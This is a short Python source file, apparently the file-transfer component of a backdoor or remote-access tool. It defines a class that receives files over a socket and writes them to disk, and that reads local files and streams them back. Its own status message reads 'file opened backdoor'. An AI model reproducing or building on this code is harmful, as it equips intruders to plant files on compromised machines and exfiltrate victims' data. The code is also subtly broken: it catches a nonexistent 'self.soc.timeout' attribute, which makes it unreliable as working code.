import DataHandling as dh

class FileHandler:
    def __init__(self,soc_obj=None):
        self.soc=soc_obj
        self.data_handler=dh.DataHandling(self.soc)

    def file_recv(self,file):
        self.soc.settimeout(1)
        with open(file,'wb') as f:
            self.data_handler.data_send("[*] file opened backdoor..")
            while True:
                try:
                    chunk = self.soc.recv(1024)
                except self.soc.timeout as e:
                    break
                if not chunk:
                    break
                self.data_handler.data_send("[*] Receving data...")
                f.write(chunk)
            f.close()
        self.soc.settimeout(None)

    def file_send(self,file):
        with open(file=file,mode='rb') as f:
            self.data_handler.data_send("[*] sending data....")
            for l in f:
                self.soc.sendall(l)
            f.close()